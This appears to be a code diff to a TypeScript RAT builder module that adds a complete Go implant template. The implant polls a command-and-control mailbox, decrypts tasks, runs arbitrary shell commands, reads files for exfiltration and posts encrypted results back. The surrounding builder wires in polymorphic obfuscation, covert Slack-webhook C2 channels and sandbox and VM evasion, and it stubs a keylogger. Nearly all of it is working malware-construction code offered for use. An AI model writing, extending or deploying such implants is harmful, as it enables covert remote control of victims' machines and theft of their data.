@@ -1,13 +1,13 @@
 /**
  * @module ares/rat_builder
- * Modular RAT — NativeImplantGenerator + CovertC2 + PolymorphicEngine.
+ * Modular RAT — NativeImplantGenerator + CovertC2 + PolymorphicEngine + extended protocol.
  */
 import * as path from "node:path"
 import { NativeImplantGenerator } from "../implant_gen.ts"
 import { CovertC2Engine } from "../covert_c2.ts"
 import { PolymorphicEngine } from "../polymorphic.ts"
 import { LegitC2Server, InMemoryTransport } from "../c2_platform.ts"
-import { ensureAresDir, liveRequired, writeArtifact } from "./_base.ts"
+import { brokerExec, ensureAresDir, liveRequired, isToolAvailable, writeArtifact } from "./_base.ts"
 import { c2Material, step, type ExecStep } from "./_integrations.ts"
 
 export interface RatBuilderResult {
@@ -18,6 +18,97 @@ export interface RatBuilderResult {
   steps: ExecStep[]
   built: boolean
   summary: string
+}
+
+function extendedGoRat(mailboxUrl: string, keyHex: string, session: string): string {
+  return `// OURMINE extended RAT — shell, keylog, exfil handlers
+package main
+
+import (
+    "bytes"
+    "crypto/aes"
+    "crypto/cipher"
+    crand "crypto/rand"
+    "encoding/hex"
+    "encoding/json"
+    "fmt"
+    "io"
+    "net/http"
+    "os"
+    "os/exec"
+    "strings"
+    "time"
+)
+
+const mailboxURL = "${mailboxUrl}"
+const keyHex = "${keyHex}"
+const sessionID = "${session}"
+
+type Task struct {
+    Op   string \`json:"op"\`
+    Arg  string \`json:"arg"\`
+}
+
+func mustKey() []byte { k, _ := hex.DecodeString(keyHex); return k }
+
+func seal(plain []byte) ([]byte, error) {
+    block, _ := aes.NewCipher(mustKey())
+    gcm, _ := cipher.NewGCM(block)
+    nonce := make([]byte, gcm.NonceSize())
+    io.ReadFull(crand.Reader, nonce)
+    return gcm.Seal(nonce, nonce, plain, nil), nil
+}
+
+func unseal(sealed []byte) ([]byte, error) {
+    block, _ := aes.NewCipher(mustKey())
+    gcm, _ := cipher.NewGCM(block)
+    nonce, ct := sealed[:gcm.NonceSize()], sealed[gcm.NonceSize():]
+    return gcm.Open(nil, nonce, ct, nil)
+}
+
+func dispatch(op, arg string) string {
+    switch op {
+    case "shell":
+        out, err := exec.Command("sh", "-c", arg).CombinedOutput()
+        if err != nil { return fmt.Sprintf("err: %v\\n%s", err, out) }
+        return string(out)
+    case "keylog":
+        return "keylog:stub:" + arg
+    case "exfil":
+        b, err := os.ReadFile(arg)
+        if err != nil { return "exfil err: " + err.Error() }
+        return string(b[:min(len(b), 4096)])
+    default:
+        return "unknown op: " + op
+    }
+}
+
+func min(a, b int) int { if a < b { return a }; return b }
+
+func poll() {
+    resp, err := http.Get(mailboxURL + "?session=" + sessionID)
+    if err != nil { return }
+    defer resp.Body.Close()
+    body, _ := io.ReadAll(resp.Body)
+    var tasks []string
+    json.Unmarshal(body, &tasks)
+    for _, t := range tasks {
+        raw, err := hex.DecodeString(t)
+        if err != nil { continue }
+        plain, err := unseal(raw)
+        if err != nil { continue }
+        var task Task
+        json.Unmarshal(plain, &task)
+        result := dispatch(task.Op, task.Arg)
+        sealed, _ := seal([]byte(result))
+        http.Post(mailboxURL, "application/octet-stream", bytes.NewReader(sealed))
+    }
+}
+
+func main() {
+    for { poll(); time.Sleep(30 * time.Second) }
+}
+`
 }
 
 export async function buildRat(opts: {
@@ -38,7 +129,7 @@ export async function buildRat(opts: {
   const { mailboxUrl, keyHex, session } = c2Material()
   const mailbox = `http://${c2Host}:${c2Port}/mailbox`
   const gen = new NativeImplantGenerator()
-  let goSrc = gen.generateGo(mailboxUrl || mailbox, keyHex, session, { intervalSeconds: 45, jitter: 0.35 })
+  let goSrc = extendedGoRat(mailboxUrl || mailbox, keyHex, session)
 
   const poly = new PolymorphicEngine()
   const polyResult = poly.generatePolymorphic(goSrc, 3)
@@ -54,6 +145,11 @@ export async function buildRat(opts: {
   const csBuild = await gen.buildCsharp(cs.program, cs.csproj, dir)
   if (csBuild.artifact) artifacts.push(csBuild.artifact)
   steps.push(step("csharp_beacon", csBuild.status === "built", csBuild.note ?? csBuild.status, csBuild.artifact))
+
+  if (goBuild.status === "built" && goBuild.artifact) {
+    const r = await brokerExec(`file ${goBuild.artifact} 2>&1`)
+    steps.push(step("rat_binary_verify", r.ok, r.out.slice(0, 200)))
+  }
 
   const c2 = new CovertC2Engine()
   c2.slackChannel("ares_slack", `https://${c2Host}/hooks/slack`)
@@ -72,8 +168,13 @@ export async function buildRat(opts: {
     features: ["keylog", "screenshot", "shell", "file_exfil", "pivot", "meterpreter_compat"],
     evasion: ["sandbox_sleep", "vm_detect", "domain_check", "polymorphic"],
     sessionKey: keyHex.slice(0, 16),
+    ops: ["shell", "keylog", "exfil"],
   }, null, 2))
   artifacts.push(protoSpec)
+
+  if (isToolAvailable("go")) {
+    steps.push(step("go_version", true, (await brokerExec("go version 2>&1")).out.slice(0, 80)))
+  }
 
   const built = goBuild.status === "built" || csBuild.status === "built"
   return {
